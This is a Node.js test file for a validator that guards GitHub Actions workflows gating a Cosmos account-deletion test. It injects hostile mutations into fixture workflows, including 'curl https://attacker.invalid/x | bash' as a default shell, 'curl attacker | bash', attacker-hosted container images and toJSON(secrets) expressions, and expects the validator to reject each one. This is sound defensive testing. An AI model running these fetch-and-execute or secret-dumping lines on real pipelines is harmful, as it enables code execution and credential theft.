import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { parseDocument } from 'yaml';
import { validateAccountDeletionCosmosLayout } from './account-deletion-cosmos-policy.mjs';
import {
  fingerprintWorkflow,
  renderWorkflowManifest,
} from './workflow-semantic-fingerprint.mjs';

const repositoryRoot = path.resolve('.');
const manifestGoldenDigest = 'd5047f44ddb3b289e8deaa2717791b2547382fa0d8bd3c960f9b236dac11e16d';
// Les workflows Cosmos de suppression de compte sont fournis explicitement par chaque
// layout testé. Les hériter du dépôt rendrait les fixtures dépendantes de l'état de
// migration courant : une fois le dépôt en état C, toute fixture porterait un one-shot
// actif en plus du layout demandé, et les états A et B deviendraient introuvables.
const layoutWorkflowNames = new Set([
  'test-account-deletion-cosmos.yml',
  'post-merge-cosmos-account-deletion.yml',
]);
const baselineWorkflowNames = fs.readdirSync(
  path.join(repositoryRoot, '.github', 'workflows'),
).filter((name) => /\.ya?ml$/.test(name) && !layoutWorkflowNames.has(name));
// Ces tests tournent sur l'arbre de `main` à chaque PR. Chaque fixture est donc jugée par un
// manifeste calculé à partir de ses PROPRES workflows — la baseline recopiée du dépôt et les
// contenus Cosmos de ce fichier —, sans pré-approbation et à une date fixe. Ni une pré-approbation
// en attente sur `main`, ni une évolution légitime des empreintes de production, ni le passage du
// temps ne peuvent alors faire échouer ces tests pour toutes les PR (#497).
const fixedNow = new Date('2026-09-23T12:00:00Z');

const legacyContent = `
name: test-account-deletion-cosmos
on:
  repository_dispatch:
    types: [test-account-deletion-cosmos]
permissions: {}
jobs:
  preflight:
    name: Validate empty dispatch payload
    runs-on: [self-hosted, Linux, X64, certigo-pr]
    permissions: {}
    steps:
      - name: Reject payload fields
        shell: bash
        env:
          CLIENT_PAYLOAD_JSON: \${{ toJSON(github.event.client_payload) }}
        run: |
          set -euo pipefail
          if ! jq -e 'type == "object" and length == 0' \\
              <<< "$CLIENT_PAYLOAD_JSON" >/dev/null; then
            echo "::error::The emulator gate does not accept payload fields."
            exit 1
          fi
  emulator:
    name: Account deletion / local emulator
    needs: preflight
    if: \${{ github.ref == 'refs/heads/main' }}
    runs-on: [self-hosted, Linux, X64, certigo-trusted]
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
        with:
          ref: \${{ github.sha }}
          persist-credentials: false
      - uses: actions/setup-dotnet@67a3573c9a986a3f9c594539f4ab511d57bb3ce9
        with:
          dotnet-version: "8.0.x"
      - name: Require a local container runtime
        shell: bash
        run: |
          set -euo pipefail
          command -v docker >/dev/null
          docker info >/dev/null
          command -v openssl >/dev/null
          command -v curl >/dev/null
      - name: Restore locked dependencies
        run: >-
          dotnet restore
          backend/tests/Certigo.Infrastructure.Tests/Certigo.Infrastructure.Tests.csproj
          --locked-mode
      - name: Run destructive test against an ephemeral local database
        env:
          ACTIONS_ID_TOKEN_REQUEST_TOKEN: ""
          ACTIONS_ID_TOKEN_REQUEST_URL: ""
        run: bash backend/run-account-deletion-cosmos-emulator.sh
`;

const archivedLegacyContent = `# RETIRED: replaced by the feature-off one-shot gate.
${legacyContent}`;

const oneShotContent = `
# FEATURE-OFF: activation requires a separate reviewed change.
name: post-merge-cosmos-account-deletion
on:
  workflow_dispatch:
concurrency:
  group: post-merge-cosmos-account-deletion-main
  cancel-in-progress: false
permissions: {}
jobs:
  account-deletion:
    name: Account deletion / Cosmos emulator
    if: >-
      github.event_name == 'workflow_dispatch'
      && github.repository == 'gchambaud_microsoft/Certigo'
      && github.ref == 'refs/heads/main'
      && vars.CERTIGO_COSMOS_EMULATOR_ENABLED == 'true'
    runs-on: [self-hosted, Linux, X64, certigo-cosmos-emulator]
    timeout-minutes: 30
    permissions:
      contents: read
    env:
      DOTNET_INSTALL_DIR: \${{ github.workspace }}/.dotnet
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
        with:
          ref: refs/heads/main
          fetch-depth: 1
          persist-credentials: false

      - name: Verify merged-main provenance
        id: provenance
        shell: bash
        run: |
          set -euo pipefail
          branch="$(git branch --show-current)"
          checked_out="$(git rev-parse HEAD)"
          remote_main="$(git rev-parse refs/remotes/origin/main)"
          if [ "$branch" != "main" ] || [ "$checked_out" != "$remote_main" ]; then
            echo "::error::The emulator gate must run the current merged main checkout."
            exit 1
          fi
          echo "sha=$checked_out" >> "$GITHUB_OUTPUT"

      - uses: actions/setup-dotnet@67a3573c9a986a3f9c594539f4ab511d57bb3ce9
        with:
          dotnet-version: "8.0.424"

      - name: Restore locked test dependencies
        run: >-
          dotnet restore
          backend/tests/Certigo.Infrastructure.Tests/Certigo.Infrastructure.Tests.csproj
          --locked-mode

      - name: Run account-deletion integration against local Cosmos
        id: cosmos-gate
        continue-on-error: true
        env:
          ACTIONS_ID_TOKEN_REQUEST_TOKEN: ""
          ACTIONS_ID_TOKEN_REQUEST_URL: ""
          AZURE_CLIENT_ID: ""
          AZURE_CLIENT_SECRET: ""
          AZURE_FEDERATED_TOKEN_FILE: ""
          AZURE_SUBSCRIPTION_ID: ""
          AZURE_TENANT_ID: ""
          ARM_CLIENT_ID: ""
          ARM_CLIENT_SECRET: ""
          ARM_SUBSCRIPTION_ID: ""
          ARM_TENANT_ID: ""
          COSMOS_EMULATOR_CONNECTION_STRING: ""
          IDENTITY_ENDPOINT: ""
          IMDS_ENDPOINT: ""
          MSI_ENDPOINT: ""
        run: bash infra/ci-runner/cosmos-emulator/run-account-deletion.sh

      - name: Clean local emulator state
        if: \${{ always() }}
        run: bash infra/ci-runner/cosmos-emulator/run-account-deletion.sh --cleanup-only

      - name: Publish result summary
        if: \${{ always() }}
        env:
          CHECKED_OUT_SHA: \${{ steps.provenance.outputs.sha }}
          GATE_OUTCOME: \${{ steps.cosmos-gate.outcome }}
          RUNNER_NAME: \${{ runner.name }}
        shell: bash
        run: |
          set -euo pipefail
          {
            echo "## Cosmos account-deletion validation"
            echo
            echo "| Field | Value |"
            echo "| --- | --- |"
            echo "| Source | merged \\\`main\\\` |"
            echo "| Commit | \\\`\${CHECKED_OUT_SHA:-unavailable}\\\` |"
            echo "| Runner | \\\`\${RUNNER_NAME}\\\` |"
            echo "| Emulator | local, digest-pinned |"
            echo "| Result | **\${GATE_OUTCOME}** |"
            echo
            echo "No artifact or live Cosmos data was produced."
          } >> "$GITHUB_STEP_SUMMARY"

      - name: Enforce emulator result
        if: \${{ always() }}
        env:
          GATE_OUTCOME: \${{ steps.cosmos-gate.outcome }}
        shell: bash
        run: |
          set -euo pipefail
          test "$GATE_OUTCOME" = "success"
`;

const activeOneShotContent = oneShotContent.replace(
  '# FEATURE-OFF: activation requires a separate reviewed change.',
  '# ACTIVATION-GATED: availability does not authorize execution.',
);

const files = {
  activeLegacy: ['workflows', 'test-account-deletion-cosmos.yml', legacyContent],
  activeOneShot: ['workflows', 'post-merge-cosmos-account-deletion.yml', activeOneShotContent],
  archivedLegacy: [
    'workflows-disabled',
    'test-account-deletion-cosmos.yml',
    archivedLegacyContent,
  ],
  archivedOneShot: [
    'workflows-disabled',
    'post-merge-cosmos-account-deletion.yml',
    oneShotContent,
  ],
};

function fixtureDigest(name, content) {
  const result = fingerprintWorkflow(`.github/workflows/${name}`, content);
  assert.deepEqual(result.errors, [], name);
  return [`.github/workflows/${name}`, result.digest];
}

function trustedFixtureManifest() {
  const baseline = Object.fromEntries(baselineWorkflowNames.map((name) => fixtureDigest(
    name,
    fs.readFileSync(path.join(repositoryRoot, '.github', 'workflows', name), 'utf8'),
  )));
  const [legacyPath, legacyDigest] = fixtureDigest('test-account-deletion-cosmos.yml', legacyContent);
  const [oneShotPath, oneShotDigest] = fixtureDigest(
    'post-merge-cosmos-account-deletion.yml',
    oneShotContent,
  );
  return renderWorkflowManifest({
    states: {
      A: { ...baseline, [legacyPath]: legacyDigest },
      B: baseline,
      C: { ...baseline, [oneShotPath]: oneShotDigest },
    },
    preApproved: {},
  });
}

function fixture(layout) {
  const container = fs.mkdtempSync(path.join(os.tmpdir(), 'certigo-cosmos-policy-'));
  fs.writeFileSync(path.join(container, 'trusted-manifest.json'), trustedFixtureManifest());
  const root = path.join(container, 'candidate');
  const workflows = path.join(root, '.github', 'workflows');
  fs.mkdirSync(workflows, { recursive: true });
  for (const name of baselineWorkflowNames) {
    fs.copyFileSync(
      path.join(repositoryRoot, '.github', 'workflows', name),
      path.join(workflows, name),
    );
  }
  const scripts = path.join(root, '.github', 'scripts');
  fs.mkdirSync(scripts, { recursive: true });
  fs.copyFileSync(
    path.join(repositoryRoot, '.github', 'scripts', 'workflow-semantic-manifest.json'),
    path.join(scripts, 'workflow-semantic-manifest.json'),
  );
  for (const label of layout) {
    const [directory, name, content] = files[label];
    const destination = path.join(root, '.github', directory, name);
    fs.mkdirSync(path.dirname(destination), { recursive: true });
    fs.writeFileSync(destination, content);
  }
  return root;
}

// Le manifeste trusted d'un fixture vit hors de son arbre candidat, comme `.trusted-control`.
function trustedManifestOf(root) {
  return path.join(path.dirname(root), 'trusted-manifest.json');
}

function validate(root, trustedRoot = root) {
  return validateAccountDeletionCosmosLayout(root, {
    manifestPath: trustedManifestOf(trustedRoot),
    now: fixedNow,
  });
}

function withFixture(layout, callback) {
  const root = fixture(layout);
  try {
    callback(root);
  } finally {
    fs.rmSync(path.dirname(root), { recursive: true, force: true });
  }
}

// Mute un workflow du dépôt par son arbre YAML, jamais par remplacement de texte : une
// reformulation sans effet sémantique (`name: "ci-infra"`) ferait d'un `.replace` littéral un
// no-op, et le test attendant un refus échouerait alors pour toutes les PR.
function mutateWorkflow(file, mutate) {
  const before = fs.readFileSync(file, 'utf8');
  const document = parseDocument(before);
  mutate(document);
  const after = document.toString();
  const canonicalPath = `.github/workflows/${path.basename(file)}`;
  assert.notEqual(
    fingerprintWorkflow(canonicalPath, after).digest,
    fingerprintWorkflow(canonicalPath, before).digest,
    'the mutation must change the semantic digest',
  );
  fs.writeFileSync(file, after);
}

test('accepts migration state A with only the invariant-preserving legacy workflow active', () => {
  withFixture(['activeLegacy'], (root) => {
    assert.deepEqual(validate(root), []);
  });
});

test('accepts migration state B with both controlled archives and no active Cosmos workflow', () => {
  withFixture(['archivedLegacy', 'archivedOneShot'], (root) => {
    assert.deepEqual(validate(root), []);
  });
});

test('accepts migration state C with only the gated one-shot active and legacy archived', () => {
  withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
    assert.deepEqual(validate(root), []);
  });
});

test('rejects every partial or mixed workflow migration layout', () => {
  const labels = Object.keys(files);
  const validMasks = new Set([0b0001, 0b0110, 0b1100]);
  for (let mask = 0; mask < 2 ** labels.length; mask += 1) {
    if (validMasks.has(mask)) {
      continue;
    }
    const layout = labels.filter((_, index) => mask & (1 << index));
    withFixture(layout, (root) => {
      const errors = validate(root);
      assert.equal(errors.length, 1, `layout ${layout.join(', ') || 'none'} must fail`);
      assert.match(
        errors[0],
        /must be exactly state A .* state B .* or state C|unexpected active Cosmos/,
      );
    });
  }
});

test('requires the lifecycle marker in archived state B and active state C', () => {
  for (const [layout, directory, lifecycleMarker] of [
    [
      ['archivedLegacy', 'archivedOneShot'],
      'workflows-disabled',
      '# FEATURE-OFF:',
    ],
    [
      ['activeOneShot', 'archivedLegacy'],
      'workflows',
      '# ACTIVATION-GATED:',
    ],
  ]) {
    withFixture(layout, (root) => {
      const file = path.join(root, '.github', directory, 'post-merge-cosmos-account-deletion.yml');
      fs.writeFileSync(file, fs.readFileSync(file, 'utf8').replace(lifecycleMarker, ''));
      assert.ok(
        validate(root)
          .some((error) => error.includes(`missing lifecycle marker ${lifecycleMarker}`)),
      );
    });
  }
});

test('rejects lifecycle markers that contradict the one-shot workflow location', () => {
  for (const [layout, directory, contradictoryMarker] of [
    [['archivedLegacy', 'archivedOneShot'], 'workflows-disabled', '# ACTIVATION-GATED:'],
    [['activeOneShot', 'archivedLegacy'], 'workflows', '# FEATURE-OFF:'],
  ]) {
    withFixture(layout, (root) => {
      const file = path.join(root, '.github', directory, 'post-merge-cosmos-account-deletion.yml');
      fs.appendFileSync(file, `\n${contradictoryMarker} invalid mixed lifecycle\n`);
      assert.ok(
        validate(root)
          .some((error) => error.includes('lifecycle marker must match')),
      );
    });
  }
});

test('rejects non-workflow_dispatch events even when they are not on a trigger blacklist', () => {
  withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
    const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
    fs.writeFileSync(
      file,
      fs.readFileSync(file, 'utf8').replace(
        '  workflow_dispatch:\n',
        '  workflow_dispatch:\n  issues:\n',
      ),
    );
    assert.ok(
      validate(root)
        .some((error) => error.includes('workflow_dispatch must be the only trigger')),
    );
  });
});

test('rejects a permissive OR composition of the required one-shot conditions', () => {
  withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
    const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
    fs.writeFileSync(
      file,
      fs.readFileSync(file, 'utf8').replace(
        "&& github.repository == 'gchambaud_microsoft/Certigo'",
        "|| github.repository == 'gchambaud_microsoft/Certigo'",
      ),
    );
    assert.ok(
      validate(root)
        .some((error) => error.includes('if condition must be the exact gated conjunction')),
    );
  });
});

test('rejects a shadow Cosmos workflow under an unexpected active filename', () => {
  for (const contract of [
    'runs-on: certigo-cosmos-emulator',
    'run: bash infra/ci-runner/cosmos-emulator/bootstrap.sh',
    'runs-on: "certigo-\\u0063osmos-emulator"',
    'run: "bash infra/ci-runner/cosmos-\\u0065mulator/bootstrap.sh"',
    'runs-on: \${{ vars.RUNNER_LABEL }}',
    'runs-on:\n      labels: \${{ fromJSON(vars.RUNNER_LABELS) }}',
  ]) {
    withFixture(['archivedLegacy', 'archivedOneShot'], (root) => {
      const file = path.join(root, '.github', 'workflows', 'cosmos-shadow.yaml');
      fs.mkdirSync(path.dirname(file), { recursive: true });
      fs.writeFileSync(file, `jobs:\n  shadow:\n    ${contract}\n`);
      assert.ok(
        validate(root)
          .some((error) => /cosmos-shadow\.yaml|exact reviewed state B set/.test(error)),
        contract,
      );
    });
  }
});

test('rejects workflow defaults, dispatch inputs, and job execution defaults', () => {
  for (const mutation of [
    [
      'permissions: {}',
      'defaults:\n  run:\n    shell: bash -c "curl https://attacker.invalid/x | bash; bash {0}"\npermissions: {}',
    ],
    [
      '  workflow_dispatch:',
      '  workflow_dispatch:\n    inputs:\n      wrapper:\n        required: true',
    ],
    [
      '    permissions:\n      contents: read',
      '    defaults:\n      run:\n        working-directory: /tmp\n    permissions:\n      contents: read',
    ],
  ]) {
    withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
      const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
      fs.writeFileSync(file, fs.readFileSync(file, 'utf8').replace(...mutation));
      assert.ok(
        validate(root)
          .some((error) => /contract must match exactly|only trigger/.test(error)),
      );
    });
  }
});

test('rejects a second ungated job and job execution indirection', () => {
  for (const addition of [
    '\n  ungated:\n    runs-on: ubuntu-latest\n    steps: []\n',
    '\n    services:\n      cosmos:\n        image: example.invalid/cosmos\n',
    '\n    container:\n      image: attacker.invalid/cosmos:latest\n',
    '\n    uses: owner/repository/.github/workflows/reusable.yml@0123456789012345678901234567890123456789\n',
  ]) {
    withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
      const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
      fs.appendFileSync(file, addition);
      assert.ok(
        validate(root)
          .some((error) => /jobs must contain only|single service-free/.test(error)),
      );
    });
  }
});

test('rejects quoted environment and id-token keys plus every secret expression syntax', () => {
  for (const addition of [
    '\n    "environment": production\n',
    '\n    permissions:\n      "id-token": write\n',
    '\n    env:\n      VALUE: "${{ secrets[\'AZURE_CLIENT_ID\'] }}"\n',
    '\n    env:\n      VALUE: "${{ secrets[inputs.secret_name] }}"\n',
    '\n    env:\n      VALUE: "${{ toJSON(secrets) }}"\n',
    '\n    env:\n      VALUE: "${{ secrets }}"\n',
  ]) {
    withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
      const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
      fs.appendFileSync(file, addition);
      assert.notDeepEqual(validate(root), []);
    });
  }
});

test('requires exact fail-closed workflow and job permissions', () => {
  for (const replacement of [
    ['permissions: {}', 'permissions: write-all'],
    ['    permissions:\n      contents: read', '    permissions: write-all'],
    ['      contents: read', '      contents: write'],
  ]) {
    withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
      const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
      fs.writeFileSync(
        file,
        fs.readFileSync(file, 'utf8').replace(...replacement),
      );
      assert.ok(
        validate(root)
          .some((error) => error.includes('permissions must be empty globally')),
      );
    });
  }
});

test('rejects YAML anchors, aliases, merge keys, and explicit tags', () => {
  for (const content of [
    activeOneShotContent.replace(
      'jobs:\n',
      'defaults: &shared\n  permissions: {}\njobs:\n',
    ).replace(
      '  account-deletion:\n',
      '  account-deletion:\n    <<: *shared\n',
    ),
    activeOneShotContent.replace(
      'name: post-merge-cosmos-account-deletion',
      'name: !!str post-merge-cosmos-account-deletion',
    ),
  ]) {
    withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
      const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
      fs.writeFileSync(file, content);
      assert.ok(
        validate(root)
          .some((error) => /aliases|anchors|tags|unsafe YAML/.test(error)),
      );
    });
  }
});

test('requires checkout and every action to use an exact lowercase 40-character SHA', () => {
  for (const reference of [
    'main',
    'v4',
    '012345678901234567890123456789012345678',
    '012345678901234567890123456789012345678G',
  ]) {
    withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
      const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
      fs.writeFileSync(
        file,
        fs.readFileSync(file, 'utf8').replace(
          'actions/checkout@11d5960a326750d5838078e36cf38b85af677262',
          `"actions/checkout@${reference}"`,
        ),
      );
      assert.ok(
        validate(root)
          .some((error) => /40-character commit SHA|checkout must pin/.test(error)),
      );
    });
  }
});

test('preserves the exact parsed legacy workflow contract in states A, B, and C', () => {
  for (const [layout, target] of [
    [['activeLegacy'], ['workflows', 'test-account-deletion-cosmos.yml']],
    [
      ['archivedLegacy', 'archivedOneShot'],
      ['workflows-disabled', 'test-account-deletion-cosmos.yml'],
    ],
    [
      ['activeOneShot', 'archivedLegacy'],
      ['workflows-disabled', 'test-account-deletion-cosmos.yml'],
    ],
  ]) {
    withFixture(layout, (root) => {
      const file = path.join(root, '.github', ...target);
      fs.writeFileSync(
        file,
        fs.readFileSync(file, 'utf8').replace('type == "object" and length == 0', ''),
      );
      assert.ok(
        validate(root)
          .some((error) => error.includes('workflow contract must match exactly')),
      );
    });
  }
});

test('rejects legacy markers hidden in comments plus extra triggers or jobs', () => {
  for (const mutation of [
    [
      '  repository_dispatch:',
      '  repository_dispatch:\n  schedule:\n    - cron: "0 0 * * *"\n# repository_dispatch:',
    ],
    [
      '  emulator:',
      '  arbitrary:\n    runs-on: ubuntu-latest\n    steps: []\n  emulator:',
    ],
    [
      'runs-on: [self-hosted, Linux, X64, certigo-trusted]',
      'runs-on: "${{ vars.RUNNER_LABEL }}"',
    ],
    [
      'permissions: {}',
      'permissions: &shared {}\ndefaults: *shared',
    ],
  ]) {
    withFixture(['activeLegacy'], (root) => {
      const file = path.join(root, '.github', 'workflows', 'test-account-deletion-cosmos.yml');
      fs.writeFileSync(file, fs.readFileSync(file, 'utf8').replace(...mutation));
      assert.notDeepEqual(validate(root), []);
    });
  }
});

test('rejects fragmented shadow runner and script composition', () => {
  withFixture(['archivedLegacy', 'archivedOneShot'], (root) => {
    const file = path.join(root, '.github', 'workflows', 'composed-shadow.yml');
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, `
name: composed-shadow
on:
  workflow_dispatch:
jobs:
  shadow:
    runs-on: [self-hosted, Linux, X64]
    env:
      ROOT: infra/ci-runner
      EMULATOR: cosmos-emulator
      SCRIPT_A: run-account
      SCRIPT_B: deletion.sh
    steps:
      - run: bash "$ROOT/$EMULATOR/$SCRIPT_A-$SCRIPT_B"
`);
    assert.ok(
      validate(root)
        .some((error) => error.includes(
          'unexpected active Cosmos account-deletion workflow contract: composed-shadow.yml',
        )),
    );
  });
});

test('rejects a generic executable job added to a known active workflow', () => {
  withFixture(['archivedLegacy', 'archivedOneShot'], (root) => {
    mutateWorkflow(path.join(root, '.github', 'workflows', 'ci-infra.yml'), (document) => {
      document.setIn(['jobs', 'generic-wipe'], document.createNode({
        'runs-on': ['self-hosted', 'Linux', 'X64'],
        steps: [{ run: 'bash infra/ci-runner/db-tools/wipe-all-records.sh' }],
      }));
    });
    assert.ok(
      validate(root)
        .some((error) => error.includes('ci-infra.yml: differs from reviewed semantic manifest')),
    );
    // Le remède doit nommer le seul chemin sûr : pré-approuver sur `main`, puis fusionner le
    // workflow. Régénérer dans la branche est sans effet, la gate lisant le manifeste de la base,
    // et faire tourner `states` sans le workflow bloquerait toutes les PR (#497).
    const remedy = validate(root)
      .find((error) => error.includes('ci-infra.yml: differs from reviewed semantic manifest'));
    assert.match(remedy, /--pre-approve/);
    assert.match(remedy, /--write/);
    assert.match(remedy, /Never rotate the manifest states without the workflow change/);
    assert.doesNotMatch(remedy, /baseline-rotation pull request first/);
  });
});

test('rejects Azure login and OIDC requests in parsed steps', () => {
  for (const step of [
    '      - uses: azure/login@0123456789012345678901234567890123456789\n',
    '      - run: core.getIDToken()\n',
    '      - env:\n          ACTIONS_ID_TOKEN_REQUEST_TOKEN: "${{ github.token }}"\n        run: echo denied\n',
  ]) {
    withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
      const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
      fs.appendFileSync(file, step);
      assert.notDeepEqual(validate(root), []);
    });
  }
});

test('rejects cloud variables, cloud login, and arbitrary shell or network steps', () => {
  for (const mutation of [
    ['AZURE_CLIENT_ID: ""', 'AZURE_CLIENT_ID: "${{ vars.AZURE_CLIENT_ID }}"'],
    ['AZURE_TENANT_ID: ""', 'AZURE_TENANT_ID: tenant'],
    [
      '      - name: Clean local emulator state',
      '      - name: Arbitrary cloud login\n        run: az login\n\n      - name: Clean local emulator state',
    ],
    [
      '      - name: Clean local emulator state',
      '      - name: Arbitrary network\n        run: curl https://example.invalid/token\n\n      - name: Clean local emulator state',
    ],
    [
      '      - name: Clean local emulator state',
      '      - name: Arbitrary shell\n        run: echo unexpected\n\n      - name: Clean local emulator state',
    ],
  ]) {
    withFixture(['activeOneShot', 'archivedLegacy'], (root) => {
      const file = path.join(root, '.github', 'workflows', 'post-merge-cosmos-account-deletion.yml');
      fs.writeFileSync(file, fs.readFileSync(file, 'utf8').replace(...mutation));
      assert.notDeepEqual(validate(root), []);
    });
  }
});

test('canonical fingerprints ignore comments and representation-only key ordering', () => {
  const canonicalPath = '.github/workflows/example.yml';
  const first = fingerprintWorkflow(canonicalPath, 'name: café\non: {}\njobs: {}\n');
  const second = fingerprintWorkflow(
    canonicalPath,
    '# ignored\njobs: {}\n"on": {}\nname: "caf\\u00e9"\n',
  );
  assert.deepEqual(first.errors, []);
  assert.deepEqual(second.errors, []);
  assert.equal(first.digest, second.digest);
});

test('canonical fingerprints never merge contents that execute differently', () => {
  const canonicalPath = '.github/workflows/example.yml';
  const script = (body) => `name: x\non: {}\njobs:\n  a:\n    steps:\n      - run: "${body}"\n`;
  // Sous bash, `\r` ne termine pas un commentaire : la première forme est inerte, la seconde
  // exécute curl. Une normalisation leur donnerait la même empreinte.
  const inert = fingerprintWorkflow(canonicalPath, script('# reviewed\\rcurl attacker | bash'));
  const executed = fingerprintWorkflow(canonicalPath, script('# reviewed\\ncurl attacker | bash'));
  assert.match(inert.errors.join('\n'), /carriage returns inside YAML strings are forbidden/);
  assert.equal(inert.digest, null);
  assert.deepEqual(executed.errors, []);
  const decomposed = fingerprintWorkflow(canonicalPath, 'name: "cafe\\u0301"\non: {}\njobs: {}\n');
  assert.match(decomposed.errors.join('\n'), /YAML strings must use Unicode NFC/);
  assert.equal(decomposed.digest, null);
  // Les fins de ligne physiques du fichier restent sans effet sur l'empreinte.
  assert.equal(
    fingerprintWorkflow(canonicalPath, 'name: x\r\non: {}\r\njobs:\r\n  a:\r\n    steps:\r\n      - run: |\r\n          echo a\r\n          echo b\r\n').digest,
    fingerprintWorkflow(canonicalPath, 'name: x\non: {}\njobs:\n  a:\n    steps:\n      - run: |\n          echo a\n          echo b\n').digest,
  );
});

test('canonical fingerprints bind the canonical path and decoded scalar values', () => {
  const content = 'name: "quoted"\non: {}\njobs: {}\n';
  const first = fingerprintWorkflow('.github/workflows/first.yml', content);
  const second = fingerprintWorkflow('.github/workflows/second.yml', content);
  const changed = fingerprintWorkflow(
    '.github/workflows/first.yml',
    'name: "quo\\u0074ed changed"\non: {}\njobs: {}\n',
  );
  assert.notEqual(first.digest, second.digest);
  assert.notEqual(first.digest, changed.digest);
});

test('strict canonical parsing rejects duplicate, normalized duplicate, alias, merge, tag, and dynamic keys', () => {
  for (const content of [
    'name: first\nname: second\n',
    '"café": first\n"cafe\\u0301": second\n',
    'shared: &shared {run: echo unsafe}\njobs: *shared\n',
    'shared: &shared {run: echo unsafe}\njobs:\n  <<: *shared\n',
    'name: !unsafe value\n',
    '"${{ vars.KEY }}": value\n',
    'timeout-minutes: 1.5\n',
    'timeout-minutes: 9007199254740993\n',
  ]) {
    const result = fingerprintWorkflow('.github/workflows/example.yml', content);
    assert.notDeepEqual(result.errors, [], content);
    assert.equal(result.digest, null, content);
  }
});

test('rejects missing, extra, and case-mismatched active workflow paths', () => {
  for (const mutate of [
    (workflows) => fs.rmSync(path.join(workflows, 'ci-infra.yml')),
    (workflows) => fs.writeFileSync(path.join(workflows, 'extra.yml'), 'jobs: {}\n'),
    (workflows) => fs.renameSync(
      path.join(workflows, 'ci-infra.yml'),
      path.join(workflows, 'CI-infra.yml'),
    ),
  ]) {
    withFixture(['archivedLegacy', 'archivedOneShot'], (root) => {
      const workflows = path.join(root, '.github', 'workflows');
      mutate(workflows);
      assert.ok(
        validate(root).some((error) => error.includes('exact reviewed state B set')),
      );
    });
  }
});

test('rejects a symlinked active workflow file', (context) => {
  withFixture(['archivedLegacy', 'archivedOneShot'], (root) => {
    const workflows = path.join(root, '.github', 'workflows');
    const target = path.join(root, 'external.yml');
    const link = path.join(workflows, 'ci-infra.yml');
    fs.copyFileSync(link, target);
    fs.rmSync(link);
    try {
      fs.symlinkSync(target, link, 'file');
    } catch (error) {
      if (error.code === 'EPERM') {
        context.skip('file symlinks require Windows developer mode');
        return;
      }
      throw error;
    }
    assert.ok(
      validate(root)
        .some((error) => error.includes('real regular non-symlink file')),
    );
  });
});

test('rejects a symlinked workflows directory', (context) => {
  withFixture(['archivedLegacy', 'archivedOneShot'], (sourceRoot) => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'certigo-cosmos-policy-link-'));
    try {
      const github = path.join(root, '.github');
      fs.mkdirSync(github, { recursive: true });
      fs.cpSync(
        path.join(sourceRoot, '.github', 'scripts'),
        path.join(github, 'scripts'),
        { recursive: true },
      );
      fs.cpSync(
        path.join(sourceRoot, '.github', 'workflows-disabled'),
        path.join(github, 'workflows-disabled'),
        { recursive: true },
      );
      try {
        fs.symlinkSync(
          path.join(sourceRoot, '.github', 'workflows'),
          path.join(github, 'workflows'),
          'junction',
        );
      } catch (error) {
        if (error.code === 'EPERM') {
          context.skip('directory links require Windows developer mode');
          return;
        }
        throw error;
      }
      assert.ok(
        validate(root, sourceRoot)
          .some((error) => error.includes('real non-symlink directory')),
      );
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });
});

test('trusted manifest rejects a workflow changed with an untrusted manifest copy', () => {
  withFixture(['archivedLegacy', 'archivedOneShot'], (root) => {
    const workflowPath = path.join(root, '.github', 'workflows', 'ci-infra.yml');
    mutateWorkflow(workflowPath, (document) => document.set('name', 'changed-ci-infra'));
    const manifestPath = path.join(
      root,
      '.github',
      'scripts',
      'workflow-semantic-manifest.json',
    );
    const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
    const canonicalPath = '.github/workflows/ci-infra.yml';
    manifest.states.B[canonicalPath] = fingerprintWorkflow(
      canonicalPath,
      fs.readFileSync(workflowPath, 'utf8'),
    ).digest;
    fs.writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);
    assert.ok(
      validate(root)
        .some((error) => error.includes('ci-infra.yml: differs from reviewed semantic manifest')),
    );
  });
});

test('by default the validator reads the manifest next to itself, never the candidate copy', () => {
  withFixture(['archivedLegacy', 'archivedOneShot'], (root) => {
    // Seul test sur le manifeste réel : la mutation porte un nonce aléatoire, qu'aucune
    // pré-approbation fusionnée sur `main` ne peut avoir anticipé.
    const workflowPath = path.join(root, '.github', 'workflows', 'ci-infra.yml');
    mutateWorkflow(
      workflowPath,
      (document) => document.set('name', `ci-infra-${crypto.randomUUID()}`),
    );
    const canonicalPath = '.github/workflows/ci-infra.yml';
    const digest = fingerprintWorkflow(canonicalPath, fs.readFileSync(workflowPath, 'utf8')).digest;
    // La PR s'accorde elle-même la pré-approbation, dans sa propre copie du manifeste.
    const copyPath = path.join(root, '.github', 'scripts', 'workflow-semantic-manifest.json');
    const copy = JSON.parse(fs.readFileSync(copyPath, 'utf8'));
    copy.preApproved = { [canonicalPath]: { digest, expires: '2999-12-31' } };
    fs.writeFileSync(copyPath, renderWorkflowManifest(copy));
    assert.ok(
      validateAccountDeletionCosmosLayout(root)
        .some((error) => error.includes('ci-infra.yml: differs from reviewed semantic manifest')),
